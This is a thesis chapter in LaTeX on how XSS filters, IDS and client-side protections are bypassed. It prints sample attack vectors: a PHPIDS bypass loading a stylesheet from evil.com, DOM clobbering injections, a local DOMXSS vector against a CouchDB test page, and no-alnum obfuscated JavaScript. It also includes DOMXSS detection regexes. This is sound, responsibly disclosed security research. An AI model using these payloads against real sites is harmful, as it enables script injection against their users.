@@ -1,0 +1,750 @@
+\section{Attacking existing Mitigation Approaches}
+\label{sec:5.attacking_existing_mitigation_approaches}
+
+\epigraph{The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards}%
+{\textsc{G. Spafford, Purdue University}}
+
+
+  After introducing several common and uncommon tools to protect web applications and similar installations from malicious input and scripting attacks, this section will now dedicate on the methodologies of breaking those defense mechanisms and libraries. The following sections and paragraphs will introduce the attacks we discovered. Furthermore we will shed light on contributions from other researchers by analyzing the security of those systems. While we do not focus on finding a systematic approach to break common filters and Intrusion Detection Systems (IDS), we will extract several patterns and especially design weaknesses of server and existing client-side protection techniques. The conclusion we aim for in this section is being discussed closely in Section~\ref{subsec:5.5.the_visibility_problem}: A visibility problem depending on the layer of the web application and server, database as well as network communication stack the protection system resides on. Our research will ultimately lead to proposing a 
+novel defense approach in Chapter~\ref{ch:4:novel-defense-approaches}; this includes a discussion and analysis of a prototypic implementation we created and opened up for public testing in several instances.
+
+  \section{Motivation behind our Attacks}
+  \label{subsec:5.1.motivation}
+  
+  The motivation behind dedicating an entire section to attacking the existing mitigation approaches will now be clarified. This thesis is meant to provide an empiric proof of server-side XSS, HTML injection and scripting web attack filters insufficiency in regards to being equipped with enough knowledge and visibility. While there are ways of continuously maintaining server-side filters and weaving in information about client-side parser faults and similar flaws, a single truly safe way of protecting filter bypasses from being possible is different: It would be to have the server-side filter know all implementation an configuration details of the visiting user agent. A rather simple yet comprehensive example might explain the origin of the assumption stating insufficiency of server-side XSS filters. On April 19th 2010, a style-sheet based XSS vector was reported as a working bypass against PHPIDS and HTMLPurifier (Listing~\ref{lst:bypassing-phpids-and-htmlpuifier}). \\
+
+  The bypass was limited to working on Internet Explorer 6 and utilized an incomplete comment block mimicking a path separator. This path separator was starting with a slash, an asterisk, and a slash -- as shown in Listing~\ref{lst:bypassing-phpids-and-htmlpuifier} (note the sequence \texttt{/**/} representing a relative path and a valid CSS comment at the same time). Neither the PHPIDS nor the HTMLPurifier did assume this substring to be a comment since another asterisk enclosed within the slashes was missing. Nonetheless, Internet Explorer 6  did not require the second asterisk to consider this substring to constitute a valid block comment. This mismatch between the server-side IDS and IPS assumptions, paired with the final interpretation of the affected user agents, defines the anatomy of the above described, as well as several other bypasses, which will be discussed in the following paragraphs. 
+
+\begin{lstlisting}[label=lst:bypassing-phpids-and-htmlpuifier,caption=Example-bypass for PHPIDS; Ambiguities between path separators and comments are being used to bypass the filter rules,captionpos=b]
+<a href="//evil.com/xss.css" style="background:url(/**/javascript:document. documentElement. firstChild. lastChild.href
+=document.documentElement. firstChild. lastChild.href);">lo</a>
+\end{lstlisting}
+
+  The outcome of this simple bypass embodies and exemplifies the foundation of this thesis. In essence, it is the protective library residing on different layer from where the attack actually unfolds and where the exploit code executes and cannot reliably work. Web browsers and browser-like implementations have grown to be of enormous complexity, seeking to be able to support a variety of web standards and standard drafts as well as a wide range of proprietary features and specifications. A server-side protection library would have to fully emulate a browser to know all of its capabilities and knowing these capabilities is an essential feature for providing a thorough defensive shield. It is a fact that numerous major and minor versions of each user agent are being used and each of them is supported by a large number of different plug-ins and extensions, and adding another layer of complexity; every single one of them can appear in different revisions, conclusively making emulation an impossible task. 
+Therefore, a motivation for this thesis is to propose a different approach to XSS and scripting web attacks.
+
+  \section{Scope of our Attacks}
+  \label{subsec:5.2.scope}
+
+  Web application security and browser security are broad topics and already featured in numerous publications. This section is aimed at covering Cross Site Scripting (XSS) and web-based scripting, as well as similar browser supported attacks. We will further cover bypasses against existing mitigation techniques, show how attackers work around well maintained and common filtering and IDS/WAF solutions and ultimately conclude in a reasoning for the necessity of a novel filtering and defense approach. Attacks targeted against a web application server are out of scope of this work-- this includes the SQL Injection attacks unless they are targeted against client-side databases defined in the HTML5 specification draft. Server-side code execution attacks, file inclusion and directory traversal vulnerabilities or similar techniques also remain outside the reach of this study. This section is not going to elaborate on browser security in terms of different script execution privilege modes, security zone models or 
+extension and Browser Helper Object (BHO) Security -- the scope in terms of browser security is simply limited to script execution in domain context. A large body of research has been published to cover the areas of interest outside the scope of this chapter and has been referenced in Section~\ref{subsec:1.3.related_work}.
+
+  \section{Ethical Considerations}
+  \label{subsec:5.3.ethical_considerations}
+
+  It needs to be noted that all bypasses and attack techniques we will cover here and in the following sections, have been reported to the appropriate vendors and disclosed responsibly. While there are still unfixed bypasses we reported earlier, this thesis will only elaborate on those that have already been approached and successfully closed by the affected software maintainers. This holds utmost importance for the high-impact bypasses of the HTMLPurifier library, SafeHTML bypasses and the ways of getting around the protective functionality of the Microsoft Internet Explorer and Google Chrome XSS filters.
+
+  \section{Attacks}
+  \label{subsec:5.4.attacks}
+
+    Subsequent parts will list and discuss a set of attacks we have deployed against existing mitigation approaches and technologies. Some of these attacks have not been published before while others are rather common, yet placed in a different context of bypassing capability for even well maintained filtering solutions. In brief, the discussed attacks are meant to underline our hypothesis -- stating that an effective defense system against web attacks can only function in an effective and reliable way if it acts on the same layer that it attempts to protect. While we will elaborate on the whereabouts of the integrated system to fend on web-based scripting attacks in Section~\ref{sec:6.rethinking_client_side_web_security}, this chapter will provide the empirical proof that contemporary security solutions against XSS and scripting attacks are no longer capable of holding their end of a bargain in hopes of keeping their security promise.
+
+    \subsection{Attack Foundations}
+    \label{subsubsec:5.4.1.attack_foundations}
+
+    The foundation of the attacks discussed in the following sections is a multi-layered information transport system accompanying the classic HTTP request and response pattern used for many technologies connected with the WWW and Internet as we know it. While scripting attacks are usually focused against one particular layer, the payload has to cross several layers and instances to actually arrive at the point of delivery. This allows a guardian to install and utilize defense mechanism on many of these layers: IDS are residing on the networking layer, server-side filters and database proxies or security libraries are residing on the application layer and filters are being employed by the user agents such as the discussed XSS filters installed in NoScript, Webkit browsers and the Internet Explorer. The range of possibilities that systems' administrator or developer can chose from might appear beneficial, unfortunately, it often turns out to be a hidden danger. Scripting attacks target and attack the DOM -- 
+the layer on which the script code gets executed and unwraps its payload. The DOM nevertheless is a very dynamic, flexible and often surprisingly flawed environment, allowing the attacker to use a large variety of tricks and browser specific techniques to make sure the attack vector will pass the layers below the DOM without raising any suspicion and thereby bypassing filters and IDS or Web Application Firewall (WAF) installations.\\
+
+    This visibility problem lays the ground for the majority of the attacks we will discuss in the following sections. While contemporary filter software, such as AntiSamy, the HTMLPurifier and SafeHTML is capable of detecting classic attacks and intrusion attempts, some other attack vectors simply cannot be detected and found as such. This is due to how they have been composed by the thrifty attacker; for instance a Network-based IDS will have severe trouble in catching out obfuscated JavaScript code using no more than non-alphanumerical characters, basically bypassing most signature based detection rules, whereas the actual interpreter used by the browser will gladly accept the code as error-free and execute it on behalf of the navigating user.\\
+
+    Some of the discussed attacks are based on principles different from simple obfuscation and they undergo a certain mutation process after having arrived in the targeted user agent and its DOM. Those attacks can be considered most dangerous for defense system residing on layers dissimilar to the attacked ones. While even a standards-obeying and formally secure system will accept those vectors without being able to notice suspicious content, the DOM of the user agent will mutate the string values of the attack vectors and weaponize them ``after arrival''. Namely, just as the attack vector is traversing all clients from its origin to the targeted user agent. So without knowing a very specific bug or a proprietary feature nor a specific unusual and non-standard behavior, the defense system has no chance to flag the incoming data as potentially dangerous and apply necessary filtering or escape-procedures. Some of the attacks we will be introducing here, can even resist the escaping and encoding, and possess 
+the capacity of being executed regardless, meaning: They remain successful after the defense system would have assumed the attack vector to be neutralized successfully.
+
+    \subsection{Obfuscation}
+    \label{subsubsec:5.4.2.obfuscation}
+
+    Obfuscating attacks has constituted a way of bypassing detection rules and heuristics since the early days of anti-virus software. Initial defensive systems started using signatures to detect malicious executables and block their execution in order to protect the attacked system~\cite{christodorescu2003static}. This approach was promising enough to be apparently considered sufficient for years. Even nowadays, anti-virus software uses signatures to detect potentially malicious binaries as one method amongst several other ways of malware detection. However, for web-based scripting attacks this approach is less promising. The very dynamic nature of JavaScript, HTML and CSS makes it close to impossible to create reliable signatures battling specific attacks. The attacker simply has to morph or re-obfuscate the client-side code to evade being detected by a signature-based anti-malware tool. Especially JavaScript allows an easy creation of morphing code changing with every single request while still deploying 
+the same payload. Heyes published an article on morphing JavaScript in 2008. He has depicted several cases of highly flexible and shape-shifting code based on few simple expressions and ternary operators~\footnote{Heyes, G., \textit{Polymorphic JavaScript}, \url{http://www.thespanner.co.uk/2008/02/27/polymorphic-javascript/} (Feb 2008)}. Combining this with the large range of free and commercial JavaScript code compressors and obfuscation tools available both on-line and as standalone versions, gives an attacker almost unlimited supply of obfuscation techniques for bypassing any signature-based detection tool. Most of these tools utilize string obfuscation, multiple encodings, padding blocks and similarly looking labels and variable names.\\
+
+    While the obfuscation results often look surprisingly complex, a thrifty malware analyst can most of the time quickly find the occurrence of an \textit{eval} call, call of the \textit{Function} constructor, \textit{setInterval}, \textit{setTimeout} or similar string-to-code methods mentioned in Section~\ref{subsubsec:6.2.7.string_to_code_and_javascript_eval_methods}. Some of the JavaScript malware we analyzed during the specification and creation of the IceShield prototype used \textit{document.write()} to inject the obfuscated string into the DOM and thereby execute code. Moreover, some samples even created new script elements in the footer area of the website~\cite{heiderich2011iceshield}. In the end, a major share of the inspected malware simply obfuscated a single string that has later been used as a source for the actual payload -- be it an evaluated string or a URL for pulling further content from. Finding this particular point in a browser malware is crucial for the necessary manual de-obfuscation.
+ IceShield attempts to solve this problem by simply wrapping all possible injection and execution points, inspecting and exposing their call parameters and values. A deeper discussion on IceShield can be found in Section~\ref{subsec:6.5.introducing_iceshield}.\\
+
+    Operational and effective JavaScript obfuscation can be equally accomplished through utilizing language specific features and browser peculiarities. In 2009, Y. Hasegawa initially posted a JavaScript language snippet, exclusively consisting of non-alphanumeric characters (later labeled no-alnum)~\footnote{Hasegawa, Y., \textit{Re: New XSS vectors/Unusual Javascript}, \url{http://sla.ckers.org/forum/read.php?2,15812,28465#msg-28465} (June 2009)}. The technique behind this novel obfuscation method was a mild abuse of a JavaScript language feature. Namely, once the instance of an object is being concatenated with any string, the constructor information leaks and thus becomes part of that string. For this reason, the code \texttt{''+{}} will result in the string \texttt{[object Object]}. In JavaScript, a string can be accessed similarly to an array -- so \texttt{(''+{})[1]} will yield the character ``o'' - second element of the string. Now only the numeric value in the array <accessor has to be turned into 
+an non-alphanumeric value as well to follow the pattern of fully non-alpha-numeric (no-alnum) JavaScript code. This can be accomplished by performing mathematical and boolean operations on empty strings such as \texttt{+!''} , resulting in the integer 1. The full code to get access to the letter ``o'' would thus look: \texttt{(''+{})[+!'']}. Another JavaScript specific feature was then used to access the global \textit{window} object and thereby gain the possibility to execute arbitrary code rather than accessing only single characters. Once the method call of a function will be called explicitly or implicitly with an empty return value, the global object will be returned instead of null or undefined. This can be demonstrated best with an ``empty'' call to \textit{sort()} -- an \textit{Array} method returning \textit{window} in the described case: \texttt{(0, [].sort)()}~\footnote{MDN, \textit{call}, \url{https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/call} (Jan 2012)}. \\
+
+    To be able to call \textit{Array.sort()} without using alpha-numeric characters, the boolean states \textit{true} and \textit{false} as well as the aforementioned character \textit{o} can be used and concatenated: \texttt{[[\_\_,\_]=!''+'',[,,,\_\_\_,,,\_\_\_\_]=!\_+''+{}][\_\_\_+\_\_\_\_+\_+\_\_]}.
+    The sequence \texttt{\_\_\_+\_\_\_\\
+\_+\_+\_\_} forms the string ``sort'' whereas the sequence \texttt{[[\_\_,\_]=!''+'',[,,,\_\_\_,,,\_\_\_\_]=!\_+''\\
++{}]} takes care of the assignment of the single character values based on the strings ``true'' and ``false[object Object]''. The technique to actually assign these values to the variables \_, \_\_, \_\_\_ and \_\_\_\_ is called \textit{destructuring assignment}~\footnote{MDN, \textit{New in JavaScript 1.7}, \url{https://developer.mozilla.org/en/New_in_JavaScript_1.7} (Jan 2012)}. This so far unique JavaScript obfuscation technique has certain disadvantages for IDS and de-obfuscation tools. Firstly, the code cannot be read by humans -- no strings indicate the actual function being called, wrapped or overwritten. Secondly, it is almost impossible to generate working and effective signatures against non-alphanumeric JavaScript code. Thirdly, alternating some of the labels and minor changes in the strings containing the initially necessary characters can completely change the code -- signature based detection tools are more or less powerless against non-alphanumeric code. Furthermore there is already a free of 
+charge set of tools available to anyone and allowing a conversion arbitrary JavaScript code into a no-alnum representation~\footnote{SW, \textit{JS-No Alnum}, \url{http://discogscounter.getfreehosting.co.uk/js-noalnum.php} (Feb 2010)}.\\
+
+    Code obfuscation in the scope of scripting web attacks is a field in a definite need for further, extensive and complementary research. Aside from the mentioned obfuscation techniques, JavaScript and similar scripting languages provide a plethora of different techniques an attacker can use to camouflage the true intent of a given code. For defense tools, it is even harder to determine if obfuscated code in general can be considered harmful or not, since several JavaScript compressors create obfuscated code for the sake of size minimization and therefore reduce bandwidth for high traffic websites~\cite{kaplan2011nofus}. 
+    Several legitimate companies provide software for these purposes -- or simply the sake of making it harder to steal JavaScript snippets from providers and enterprises basing assets of their business model on client-side code. With growing user agent, server and database features, new obfuscation methods will be discovered. Heiderich et. al published a book on the topic of obfuscated code used for attacking web applications~\cite{heiderich_web_2010}. To conclude, we strongly believe that any software promising protection against web attacks should be immune against obfuscation attacks.
+
+    \subsection{DOM Clobbering}
+    \label{subsubsec:5.4.3.dom_clobbering}
+
+    The term DOM-clobbering refers to a technique that has been documented by security researchers and developers years ago~\footnote{Heiderich, M., \textit{HTML Form Controls reviewed}, \url{http://maliciousmarkup.blogspot.com/2008/11/html-form-controls-reviewed.html} (Nov 2008)}. DOM clobbering bases upon a DOM property shortcut implemented by most user agents, despite being labeled as deprecated. In essence, the DOM enables accessing certain elements referenced with an ID or a name attribute directly, that is, without utilizing accessor functions like \textit{document.getElementById} or \textit{document.getElementsByName}. The purpose has once been to ease access to forms and similar elements for web developers -- allowing to globally reference a form by its name and call its submit method, as shown in for example: \texttt{formname.submit()} instead of \texttt{document.forms.formname.submit()}. The preceding example from Listing~\ref{lst:global-references} outlines the whereabouts of DOM shortcuts and DOM 
+clobbering -- often also referred to as global references and form controls~\footnote{Fey, J., \textit{Referencing Forms and Form Controls}, \url{http://www.jibbering.com/faq/notes/form-access/} (May 2010)}.
+
+\begin{lstlisting}[label=lst:global-references,caption=Example for global DOM references; HTML elements cause overwriting of native DOM properties,captionpos=b]
+<form id="foo">
+  <input id="bar" value="hello">
+</form>
+<img name="foobar">
+<script>
+  alert(foo) // [object HTMLFormElement]
+  alert(foo.bar) // [object HTMLInputElement]
+  alert(document.foobar) // [object HTMLImageElement]
+</script>
+\end{lstlisting}
+
+    The user agent will create global references based on the name and ID attributes while parsing the DOM tree -- pointing to the named and identified HTML elements. This is not for all elements: depending on the attribute type and element type, the reference will either be created in the global scope or in the document scope. Embed tags and image tags supplied with a name, for instance, will be referenced in the document scope. Form elements with an ID will be referenced in the global scope, similarly to input elements. The latter will as well be referenced as child elements of the global form reference -- so the user agents create not only one but at least two additional objects in the DOM. The main problem here has been initially addressed by Smith and Manno's unsafe names for form controls~\footnote{Smith, G., \textit{Unsafe Names for HTML Form Controls}, \url{http://www.jibbering.com/faq/names/unsafe_names.html} (July 2009)}. The problem they have described was initially observed from developers' 
+perspective. In case a developer creates a form applied with a name of an object that already exists, he might access a different object than the one intended, by using the global reference. This might confuse the application and cause bugs depending on browser and doc-type. Our perspective on this problem is a completely different one: If an attacker manages to inject an element containing a \textit{id} or \textit{name} attribute, existing and trusted DOM properties might be overwritten by the element injection and cause defensive script to throw exceptions and prematurely stop executing. An example attack vector might look like this: \texttt{http://example.com/?id="><img name="getElementsByTagName">} Once a script on the website will try to call \textit{document.getElementsByTagName}, the script will fail because the image object of the injected \textit{img} tag will be accessed. The image imply overwrites the existing native DOM method with itself -- due to the maliciously prepared \textit{name} attribute.
+ Zaytsev published a DOM security test-suite to detect conflicts between DOM properties and form controls called DOMLint~\footnote{Zaytsev, J., \textit{DOMLint - Test suite against HTML/DOM conflicts}, \url{http://kangax.github.com/domlint/} (Sept 2010)}. Note that DOM clobbering affects all tested modern user agents.\\
+
+    Later sections, specifically Section~\ref{subsubsubsec:6.6.4.2_event_control} and Section~\ref{subsubsec:6.7.2.taming_javascript_uris} describe the evaluation method for a client-side protection script we are introducing. During the evaluation phase, DOM clobbering attacks were the most surprising and hard to mitigate bypasses we have experienced. Essentially the solution we propose in Chapter~\ref{ch:4:novel-defense-approaches} relies on DOM methods such as \textit{getElementsByTagName}, the \textit{attributes} property of a DOM node or \textit{document.body.firstChild}. The attacks managed to fully overwrite these properties by injecting \textit{img} and \textit{form} elements applied with \textit{name} attributes set to \textit{firstChild} or even \textit{getElementsByTagName}. We thereby realized: Once our script attempts to call the method \textit{getElementsByTagName}, the browser returns the image tag instead of the method and the script aborts execution and throws an exception. Our script 
+therefore needed to be hardened by making sure that these methods were actual and indeed those native DOM methods we have expected them to be. Surprisingly, the technique of freezing the DOM methods we had to use later on did not generate any effect. DOM clobbering attacks are stronger than \textit{Object.freeze()} and \textit{Object.defineProperty()} -- the only effect we could obtain was to freeze the already overwritten property and seal the attack code. Note that depending on the user agent, some DOM properties can be clobbered, while others cannot. This inhomogeneous implementation make this attack technique even harder to be addressed properly.\\
+
+    DOM clobbering attacks were used against many real life applications which we have tested during the research intended for this thesis. As soon as an application allows a user submitting HTML content containing \textit{id} or \textit{name} attributes, DOM clobbering attacks are possible. An attacker can inspect the client-side JavaScript code, monitor which native DOM properties are being used, attempt to overwrite them with the HTML element constructors of the injected nodes and interrupt the client-side application flow. An especially interesting attack was discovered by Dalili during one of the challenges we published for evaluation purposes~\footnote{Dalili, S., \textit{IRSDL - JSLR XSS}, \url{http://pastebin.com/vb3vM0VC} (Nov 2011)}. He has discovered that nesting several form elements and wrapping the second form inside a \textit{fieldset} element causes the DOM on Firefox to create global references, even if they are protected and form elements are stripped off any potential DOM clobbering 
+attributes. This attack marked the most recent bypasses of the DOM-based XSS protection attempt we introduce. Extended fixes were necessary to contain this browser bug. They could ultimately be deployed later, during the third enrollment of the challenge. DOM clobbering is an attack technique that can be considered most problematic for applications that heavily rely on client-side logic. It needs to be underlined that this is not limited to the case of web applications.
+
+    \subsection{DOMXSS}
+    \label{subsubsec:5.4.4.domxss}
+
+    DOMXSS, further known as DOM-based XSS as well as \textit{XSS of the 3rd kind} did not receive research attention comparable to the two classic variations of Cross-Site Scripting: Reflected XSS and persistent XSS. This is demonstrated in Section~\ref{subsec:1.3.related_work}. Thorough work on the body of DOMXSS has first been published by Klein in 2005~\cite{klein_dom_2005} who described sources of DOMXSS vulnerabilities as well as sinks, namely properties in the DOM capable of leading to script execution and even worse consequences in case an attacker can influence their contents. \\
+
+    In essence, DOMXSS is not entirely different from the classes of XSS outlined and analyzed in earlier sections. An attacker can inject string data into a property that is being reflected without proper filtering and sanitation. In addition, the consequences of DOMXSS attacks are similar to those of reflected and persistent XSS. Usually the JavaScript code injected via DOMXSS exploits executes on the affected domain and has full access to all DOM properties exposed by browser and website. The key difference can be seen in the way DOMXSS attacks are being initiated -- specifically the properties they attack to achieve client-side script-code execution. While a classic XSS attack usually abuses a lack of proper filtering on the server, DOMXSS only affects client-side vulnerabilities and most times it is being carried out by the use of properties only the client has access to. One example for those properties is the \textit{location.hash} string. This string, represented by the part in a URL starting with a 
+sharp character (U+0023), is not being sent to the server but only meant to be used as client-side fragment identifier. By choosing a location hash that matches the ID of an existing DOM element on a website, the user agent will attempt to focus that element in case it is visible~\footnote{MDN, \textit{window.location}, \url{https://developer.mozilla.org/en/DOM/window.location} (Dec 2011)} -- note the example code shown in Listing~\ref{lst:focusing-element-with-hash}. Some user agents even allow selective styles via CSS3 and the \textit{:target} pseudo-class by matching selected elements and the \textit{location.hash} value. Several widely used JavaScript libraries provide integrated in-page navigation systems for structured contents such as tabs, dynamic lists or accordion navigation. \\
+
+\begin{lstlisting}[label=lst:focusing-element-with-hash,caption=Example for a URL equipped with a location hash value causing a DOM node to be focused,captionpos=b]
+URL: test.html#focus-me
+
+<!doctype html>
+<body>
+  <a id="focus-me" href="#" onfocus="alert('focus event')">TEST</a>
+</body>
+\end{lstlisting}
+
+    Once a client-side script uses \textit{location.hash}, all interaction happening via this property is by default completely invisible to the server. Changing \textit{location.hash} does not send a request to the server unless a developer explicitly implemented such feature. This means that in most cases, the value of \textit{location.hash} cannot be checked or sanitized by server-side protection mechanisms. The string value simply does not arrive there but will be processed exclusively by the user agent of the client-side logic. After a developer makes a mistake of enabling the unfiltered reflection of properties such as \textit{location.hash}, a DOMXSS vulnerability might constitute the result. In 2011, a wide spread vulnerability in several \textit{jQuery} related libraries was being reported, abusing unsafe treatment of \textit{location.hash} and thereby rendering millions of websites and open source software products vulnerable to DOMXSS~\footnote{Mala, \textit{XSS with \$(location.hash)}, \url{http:/
+/ma.la/jquery_xss/} (June 2011)}. \\
+
+    The \textit{location.hash} property is just a single example for a classic DOMXSS \textit{source} -- as for many vulnerability patterns we differ between a source for malicious content and a sink for the place where it turns to become executable code. The DOMXSS Wiki created originally by Di Paola et al. lists a whole array of further sources and sinks~\footnote{Di Paola, S., \textit{DOMXSS Wiki -- Introduction}, \url{http://code.google.com/p/domxsswiki/wiki/Introduction} (Dec 2011)}. Among these sources are DOM properties such as \textit{document.referrer}, \textit{window.name}, the history object and most importantly the \textit{location} object and its child properties. Essentially, any object capable of being influenced from remote, other domains, plug-in code or HTTP headers can be a possible DOMXSS source. \\
+
+    The possible sinks for DOMXSS attacks are more complicated to enumerate, since they heavily depend on the application logic in whether a property is a valuable sink or not. There is no fix rule for DOMXSS' determination of whether a property is a sink as it depends on many factors such as the mentioned application logic, user behavior and even the browser version which is being used. The property \textit{document.URL} for instance is no sink on most browsers and it usually is not even a working source. Nevertheless, on Internet Explorer \textit{document.URL} is both -- since it can be set causing a redirect and it can be used to transport arbitrary string content, since its value is not being URL-encoded as on other browsers. The whole range of redirect sources can usually be seen as DOMXSS source as well. We therefore attempted to enumerate existing redirect sources on the HTML5 security Wiki for documentation purposes and as a developer reference~\footnote{Heiderich, M. et al., \textit{Redirection 
+Methods}, \url{http://code.google.com/p/html5security/wiki/RedirectionMethods} (June 2011)}. Furthermore, we developed a regular expression attempting to find either sinks and sources in the uncompressed JavaScript code to assist finding possible DOMXSS vulnerabilities. The DOMXSS scanner ``DOMinator'' developed by Di Paola utilized this regular expression as well. The code shown in Listing~\ref{lst:domxss-sinks-and-src} shows the current version of this regular expression~\footnote{Di Paola, S., \textit{DOMinator Project}, \textit{http://blog.mindedsecurity.com/2011/05/dominator-project.html} (May 2011)}.
+
+\begin{lstlisting}[label=lst:domxss-sinks-and-src,caption=Regular expressions to help finding DOMXSS vulnerabilities; common sources and sinks are being identified,captionpos=b]
+// Find DOMXSS sources
+/(location\s*[\[.])|([.\[]\s*["']?\s* (arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?| showModalDialog|cookie|URL|documentURI|baseURI|  referrer|name|opener| parent|top|content|self|frames)\W)| (localStorage|sessionStorage|Database)/ 
+
+//Find DOMXSS sinks
+/((src|href|data|location|code|value|action) \s*["'\]]*\s*\+?\s*=)|((replace|assign|navigate| getResponseHeader|open(Dialog)?|showModalDialog| eval|evaluate|execCommand|execScript|setTimeout| setInterval)\s*["'\]]*\s*\()/
+\end{lstlisting}
+
+
+    While DOMXSS is hard if not impossible to detect and/or prevent by server-side protection tools, an even more dangerous way of using this attack technique needs to be faced. Here, we come to having JavaScript code execution and DOMXSS inside local JavaScript files in mind. In fall 2010, we have analyzed a default installation of Ubuntu Linux version 10 and scanned the locally existing JavaScript files for potential DOMXSS vulnerabilities with a use of the aforementioned regular expression. It turned out that several files actually contained DOMXSS injection points and one of them was executable without user interaction. An attacker was thus capable of executing local JavaScript code on a unsuspecting victim's computer -- directly after a fresh Ubuntu installation with no additional packages. The vulnerability was spotted in one of the test cases set up for the CouchDB installation used by several components of the operating system~\footnote{Apache Foundation, \textit{CouchDB Project}, \url{http://couchdb.
+apache.org/} (Dec 2011)}. It was possible to inject data via \textit{location.href}, since its value was being used by the local script, scanned and then split into several fragments of which one was later used as a source for a script tag. In this particular scenario, there was a complete lack of options for a server to scan the incoming data for possible vulnerabilities, since there was no server in place altogether, but a local JavaScript file callable via a \textit{file:} URI handler. The affected code snippet is shown in Listing~\ref{lst:local-domxss-couchdb}. A proof-of-concept exploit was created to bypass the default browsers local SOP restrictions, mentioned in Section~\ref{subsubsubsec:2.4.1.1.same_origin_policy} using an applet capable of reading local files and sending the result to an external domain. \\
+
+\begin{lstlisting}[label=lst:local-domxss-couchdb,caption=Local DOMXSS vulnerability and exploit in CouchDB Testsuite discovered during our DOMXSS research,captionpos=b]
+// Vulnerable section in CouchDB test case 
+// /usr/share/couchdb/www/couch_tests.html
+var testsPath = document.location.toString().split('?')[1];
+loadScript(testsPath||"script/couch_tests.js");
+
+// Matching attack vector
+file:///usr/share/couchdb/www/couch_tests.html?data:,alert%281%29
+\end{lstlisting}
+
+    DOMXSS can affect any form of document containing JavaScript improperly using the aforementioned DOMXSS sources and sinks. Once a user agent, be it a browser, email client or instant messaging tool, is capable of executing JavaScript, a DOMXSS can be carried out. The only instance possibly able to protect the victim is a client-side XSS filter, such as NoScript, the Internet Explorer XSS filter or comparable environments. As soon as those are bypassed, or just not in place, the attacker has full access to the DOM, and the local file system sometimes too, depending on what the location of the attacked document is. DOMXSS is therefore one of the most significant aspects of client-side security and marks the ultimately important reason for developing client-side protection located directly in the DOM itself -- rather than outside on different layers, that may be potentially blind to the DOM-based attacks. Di Paola extensively analyzed the Alexa Top 100 in 2011 and found 56 of 100 websites to be vulnerable 
+against DOMXSS attacks~\footnote{Di Paola, S., \textit{DOM Xss Identification and
+Exploitation}, \url{http://media.hacking-lab.com/scs3/scs3_pdf/SCS3_2011_Di_Paola.pdf} (2011)}.
+
+    \subsection{Attacking SOP Weaknesses}
+    \label{subsubsec:5.4.5.attacking_sop_weaknesses}
+
+    The Same Origin Policy (SOP) can often be seen as the single-point-of-failure (SPOF) in browser security -- as described in Section~\ref{subsubsubsec:2.4.1.1.same_origin_policy}. Most of the privacy prevailing security mechanisms rely on the SOP -- breaking it then would expose a vast range of websites and their users to a variety of threats. Since browsers and web documents provide a lot of interfaces possibly exposing sensitive data, the SOP has to be in place for many components -- sometimes with slight variations or weaknesses caused by requirements based on legacy features or developer and usability needs. The following paragraphs will discuss some of the DOM interfaces and components providing blurry, weak or sometimes even no borders between different origins and therefore help attackers deploying their exploit code.\\
+
+    One classic DOM property originating from the ages where frames have been uses prominently in websites to structure and separate content from navigational and other meta-areas is \textit{window.name}~\footnote{MDN, \textit{window.name}, \url{https://developer.mozilla.org/en/DOM/window.name} (Dec 2011)}. Once set for a window or framed document, this property will outlive page reloads, page changes and domain changes in that same window. Once a website sets \textit{window.name} to a secret value and the user navigates away from this website, any other website loaded in the same tab or window can read the value afterwards -- unless destroyed ``onunload'' or overwritten by a different website. This is a helpful tool for XSS attackers, since it helps minimizing payload length. An attacker can simply prepare payload on \textit{example.com} or \textit{attacker.com}, lure the victim on this website, redirect the victim to \textit{infected.com} and there simply call a JavaScript snippet such as \texttt{eval(name)
+} or \texttt{location=name}. Our tests showed that \textit{window.name}, depending on the user agent, can hold up to several hundreds of megabytes of data. Except for providing an easy and convenient way to shorten attack payload, \textit{window.name} can cause even further threats. One problem is the possibility to set the property across domains and tabs by using a link supplied with the target attribute. The target attribute can either deliver an indicator for the user agent on how to open the selected link (same window, new window, parent window, top window), predefine the name for a new window, or open the linked resource in an existing frame matching name and content of the target attribute. The code shown in Listing~\ref{lst:usage-of-target} shows several ways a developer can use the target attribute.
+
+\begin{lstlisting}[label=lst:usage-of-target,caption=Several use-cases for the target attribute causing different opening behavior scenarios,captionpos=b]
+<a href="#test">CLICKME</a> 
+<!-- no target - opens in same window -->
+
+<a href="#test" target="_top">CLICKME</a> 
+<!-- opens in top window -->
+
+<a href="#test" target="_parent">CLICKME</a> 
+<!-- opens in parent window -->
+
+<a href="#test" target="_blank">CLICKME</a> 
+<!-- opens in new tab/window -->
+
+<a href="#test" target="new">CLICKME</a> 
+<!-- opens in a new window then named `new` - if no window of that name exists -->
+
+<a href="#test" target="existing">CLICKME</a> 
+<!-- opens in the window named `existing` in case it exists - else in a new window -->
+\end{lstlisting}
+
+
+    Further SOP bypasses can be found when dealing with URI schemes such as \texttt{about:} and \texttt{data:} on several user agents. Some browsers allow for instance to set properties such as the document's \textit{designMode} to ``on'' while a window is displaying \textit{about:blank}. The designMode is a special mode a browser can be put into when rendering a website; once this mode is activated, a user can add and edit text, move elements via drag \& drop and most scripting and link handlers will be deactivated~\footnote{MSDN, \textit{designMode Property}, \url{http://msdn.microsoft.com/en-us/library/ms533720(v=vs.85).aspx} (Dec 2011)}. Once the script afterwards initiates a redirect to a different domain, the \textit{designMode} will still be enabled and open that domain for drag\&drop injections. The attack impact and success probability can be enhanced by UI redressing and framing techniques. An attacker can frame the domain loaded in \textit{designMode}, have the parent frame display text 
+encouraging a user to drag\&drop an object into that frame without having it be visible. The dragged object, displayed as for instance a basketball to be dragged into a basket, could be a Java applet that after being dropped into the editable frame would execute JavaScript on this domain. This attack technique is being called \textit{Self-XSS} -- since a user literally has to carry out the attack her- or himself~\footnote{Tyson, J., \textit{Recent Facebook XSS Attacks Show Increasing Sophistication}, \url{http://theharmonyguy.com/2011/04/21/recent-facebook-xss-attacks-show-increasing-sophistication/} (Apr 2011)}. Social engineering and UI redressing as mentioned raise probability to trick the user into that particular interaction. The \textit{designMode} property is therefore a substantial tool to weaken the SOP since it allows user initiated transport of interactive objects between domains.\\
+
